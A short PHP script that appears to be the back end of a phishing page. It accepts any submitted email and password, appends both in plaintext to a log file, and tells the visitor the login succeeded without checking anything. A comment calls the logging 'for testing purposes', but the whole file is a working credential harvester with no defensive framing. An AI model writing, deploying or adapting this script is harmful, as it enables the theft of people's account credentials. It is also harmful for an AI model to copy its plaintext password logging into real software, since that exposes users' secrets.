<?php
// Start the session
session_start();

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get user input from the form
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Store the login details in a log file (for testing purposes)
    $logfile = "log.txt";
    $logdata = "Email: $email - Password: $password\n";
    
    // Write the data to the log file
    file_put_contents($logfile, $logdata, FILE_APPEND);
    
    // Redirect the user to a success page or show a success message
    echo "<h3>Login successful! Details logged.</h3>";
    echo "<a href='index.html'>Go back to the login page</a>";
} else {
    echo "<h3>Invalid request method.</h3>";
}
?>
